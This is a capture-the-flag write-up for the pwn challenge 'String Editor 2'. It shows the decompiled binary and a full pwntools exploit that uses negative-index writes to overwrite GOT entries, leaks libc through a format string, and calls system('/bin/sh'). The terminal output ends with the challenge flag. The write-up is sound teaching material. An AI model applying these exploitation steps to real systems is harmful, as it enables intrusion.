# String Editor 2

The description for this challenge is as follows:

*The last version was WAY too vulnerable. Who had the idea to leave debug info in? Changelog:*

  * *removed debug info*
   

  *  *new sponsors who won't leak our secrets*
   

  *  *ui improvements*
   

  *  *new util tab*
   

  *  *you can't edit stuff other than your string anymore*

This challenge was worth 300 points, and it seems to have had 44 solves at the end of the competition. It didn't require any knowledge that was too heavily specialized in terms of pwn challenges, but it did require a bit of creative thinking that I don't think I've seen before. As a result, I would rate it a medium-difficulty pwn challenge like its predecessor. It uses the same libc as before, so use Ubuntu 20 for optimal results on local debugging.

**TL;DR Solution:** Input negative indexes in order to overwrite the got. Overwrite strcpy to printf in order to create a format string vulnerability and leak a libc address. Then overwrite strcpy again to system and use it to pop a shell.

## Gathering Information

When we run the binary, we see that it seems to function fairly similarly to the last one. We see what looks like some sort of leak from our sponsors, and we get to edit a string in a continuous loop. Some of the biggest changes visible here are the lack of "DEBUG" information as an additional leak, and the fact that indexes larger than 15 cause execution to stop.
```
knittingirl@piglet:~/CTF/imaginaryCTF$ nc chal.imaginaryctf.org 42005
Welcome to StringEditor™!
Today, you will have the AMAZING opportunity to edit a string!
But first, a word from our sponsors: 0x7fffff6c6f6c

Here ya go! Your string is:
***************
What character would you like to edit? (enter in 15 to see utils)
3
What character should be in that index?
a
Done.
Here ya go! Your string is:
***a***********
What character would you like to edit? (enter in 15 to see utils)
17
Go away hacker.
```
However, when we open the binary up in Ghidra, we can see that a lot more has changed. Instead of being stored on the heap, our string is now a global variable called target that we get to edit. Also, the leak is a lie; it's just a hardcoded string that will be the same every time, but it does use the printf function instead of puts. While indexes of more than 15 are not allowed, negative indexes do not seem to be filtered out. Notably, global variables tend to be stored shortly after the GOT table, so negative indexes should be able to access GOT entries.
```
  printf("But first, a word from our sponsors: 0x%x%x%x%x%x%x\n\n",0x7f,0xff,0xff,0x6c,0x6f,0x6c,
         uVar1);
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          puts("Here ya go! Your string is:");
                    /* My string is actually in a global. Note that GOT entries come after it. */
          puts(target);
                    /* There is only partial RELRO, so GOT overwrite time? */
          puts("What character would you like to edit? (enter in 15 to see utils)");
          __isoc99_scanf("%ld%*c",&my_index);
                    /* Can't go beyond the end, but a negative index still works */
          if (0xf < my_index) {
                    /* This make my GOT overwrite dreams rather hard. */
            puts("Go away hacker.");
                    /* WARNING: Subroutine does not return */
            exit(-1);
          }
          if (my_index == 0xf) break;
          puts("What character should be in that index?");
          __isoc99_scanf("%c%*c",&my_character);
          target[my_index] = my_character;
          puts("Done.");
        }
        puts("1. Admire your string");
        puts("2. Delete your string");
        puts("3. Exit");
        __isoc99_scanf("%ld%*c",&my_index);
        if (my_index != 1) break;
                    /* This will just puts my string */
        admire();
      }
      if (my_index != 2) break;
                    /* String-copies all asterisks into my string area. */
      del();
    }
  } while (my_index != 3);
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```
In addition, entering 15 now brings up an additional menu that gives us the option to "Admire" or "Delete" the string. Ultimately, the admire option was not particularly relevant; however, the delete option will strcpy the default asterisks into the global variable target.
```
void del(void)

{
  strcpy(target,"***************");
  return;
}
```
Finally, we run checksec on the binary and notice significantly fewer protections than last time. There is only Partial RELRO, which we can probably assume is deliberately pushing us in the direction of a GOT overwrite. There is also no PIE, so we can potentially jump to code sections without requiring leaks.
```
knittingirl@piglet:~/CTF/imaginaryCTF$ checksec string_editor_2
[*] '/home/knittingirl/CTF/imaginaryCTF/string_editor_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Writing the Exploit

Based on all of this information, it looks like a GOT overwrite would be the best strategy. Since we can overwrite only one character at a time, we should try to use a function that will only be triggered when we are ready; if a half-overwritten function is called, it will probably trigger an error and stop program execution. Since strcpy is never executed in the while loop unless the delete string option is selected, it makes the most sense as a target. 

Now, the binary does not contain a win function, and there are no imported libc functions that would let us pop a shell or read a file. As a result, we will need to ret2libc, and we will need to leak the ASLR address. Ultimately, the fake leak provided initially is actually helpful here since it gave us printf within the binary. Since strcpy uses the target global as its first parameter, if we overwrite the GOT entry to the PLT address of printf, we can edit the string to something along the lines of "%p%p%p%p" and create a format string vulnerability, which can in turn leak a libc value.

With a little bit of trial and error, we can determine that the format string "%13$p" seems to be leaking a libc value. By running the exploit locally and looking up the value in the leak with GDB-GEF (i.e. x/5i 0x7f8fac3c40b3), we can determine that this leak is the address of __libc_start_main+243, and we can derive a libc base from there. We can now derive the address of system in libc, and use a very similar process to call system(/bin/sh)

## The Exploit Itself

The full exploit in Python is shown below:

```
from pwn import *

#target = process('./string_editor_2') #, env={"LD_PRELOAD":"./libc.so.6"})
#pid = gdb.attach(target, "\nb *del\n set disassembly-flavor intel\ncontinue")

target = remote('chal.imaginaryctf.org', 42005)

libc = ELF('libc.so.6')
elf = ELF('string_editor_2')


#Gadgets:

target_global = 0x601080

printf_got = elf.got['printf'] 
strcpy_got = elf.got ['strcpy'] 
printf_plt = elf.symbols['printf']  

#%13$p leaks __libc_start_main+243
payload = b'%13$p%14$p'
for i in range(len(payload)):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(i).encode('ascii')) #(str(puts_got - target_global).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))

#Now to overwrite GOT entry
payload = p64(printf_plt)

for i in range(6):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(strcpy_got - target_global + i).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))
	
print(target.recvuntil(b'utils', timeout=1))
target.sendline(b'15')
print(target.recvuntil(b'3. Exit\n'))
target.sendline(b'2')

leak = target.recv(14)
print(leak)


libc_start_main = int(leak, 16) - 243
print(hex(libc_start_main))

libc_base = libc_start_main - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
print(hex(system))

#Now to call system(/bin/sh)

payload = b'/bin/sh\x00'
for i in range(len(payload)):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(i).encode('ascii')) 
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))

payload = p64(system)

for i in range(6):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(strcpy_got - target_global + i).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))
	
print(target.recvuntil(b'utils', timeout=1))
target.sendline(b'15')
print(target.recvuntil(b'3. Exit\n'))
target.sendline(b'2')

target.interactive()

```
And the results in the terminal look like this:
```
knittingirl@piglet:~/CTF/imaginaryCTF$ python3 string_editor_2_payload.py 
[+] Opening connection to chal.imaginaryctf.org on port 42005: Done
[*] '/home/knittingirl/CTF/imaginaryCTF/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/knittingirl/CTF/imaginaryCTF/string_editor_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b'Welcome to StringEditor\xe2\x84\xa2!\nToday, you will have the AMAZING opportunity to edit a string!\nBut first, a word from our sponsors: 0x7fffff6c6f6c\n\nHere ya go! Your string is:\n***************\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%**************\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%1*************\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13************\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$***********\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p**********\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%*********\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%1********\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14*******\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$******\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\n1. Admire your string\n2. Delete your string\n3. Exit\n'
b'0x7fb9b7ed70b3'
0x7fb9b7ed6fc0
0x7fb9b7f05410
b'0x7fb9b80d3620*****Here ya go! Your string is:\n%13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/13$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/b3$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bi$p%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/binp%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/%14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/s14$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh4$p*****\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\nWhat character should be in that index?'
b'\nDone.\nHere ya go! Your string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to see utils'
b')\n1. Admire your string\n2. Delete your string\n3. Exit\n'
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
ictf{g0t_0v3rwr1te?????????????????????????_953a20b1}

```
Thanks for reading!

